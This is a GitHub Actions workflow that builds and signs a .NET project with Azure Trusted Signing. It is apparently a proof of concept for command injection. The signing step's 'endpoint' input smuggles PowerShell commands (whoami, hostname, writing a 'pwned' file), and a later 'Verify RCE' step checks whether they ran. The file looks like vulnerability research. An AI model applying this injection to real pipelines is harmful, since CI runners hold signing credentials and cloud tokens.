name: ci

on:
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read

jobs:
  build-and-sign:
    strategy:
      matrix:
        os: [windows-2025]
    runs-on: ${{ matrix.os }}
    
    name: Build and sign on ${{ matrix.os }}
    steps:
      - name: Checkout
        uses: actions/checkout@v3

      - name: Setup .NET Core SDK
        uses: actions/setup-dotnet@v4
        with:
          dotnet-version: 8.0.x

      - name: Install dependencies
        run: dotnet restore MyApi/MyApi.csproj

      - name: Build
        run: dotnet build --configuration Release --no-restore MyApi/MyApi.csproj

      - name: Azure login
        uses: azure/login@v2
        with:
          client-id: ${{ secrets.AZURE_CLIENT_ID }}
          tenant-id: ${{ secrets.AZURE_TENANT_ID }}
          subscription-id: ${{ secrets.AZURE_SUBSCRIPTION_ID }}
          enable-AzPSSession: true

      - name: Sign files with Trusted Signing
        uses: azure/trusted-signing-action@bc58bc775bec2c1a94b6125e954f17fb3cd47a45
        with:
          endpoint: '"; Write-Host ''RCE-ACHIEVED''; whoami; hostname; echo ''pwned'' > $env:TEMP\pwned.txt; exit 0; #'
          trusted-signing-account-name: jaxelr
          certificate-profile-name: jaxelr-pt
          files-folder: ${{ github.workspace }}\\MyApi\bin\Release\net8.0
          files-folder-filter: exe,dll
          file-digest: SHA256
          timestamp-rfc3161: http://timestamp.acs.microsoft.com
          timestamp-digest: SHA256

      - name: Verify RCE
        shell: pwsh
        run: |
          Write-Host "=== Checking for RCE evidence ==="
          if (Test-Path "$env:TEMP\pwned.txt") {
            Write-Host "RCE-ACHIEVED - File created!"
            Get-Content "$env:TEMP\pwned.txt"
          } else {
            Write-Host "Checking if RCE executed in action logs above..."
          }
          Write-Host "PoC completed - check logs above for RCE-ACHIEVED"


      - name: Upload artifact on pull request
        uses: actions/upload-artifact@v4.3.3
        with:
          name: WebApp-${{ matrix.os }}
          path: ${{ github.workspace }}\\MyApi\bin\Release\net8.0
      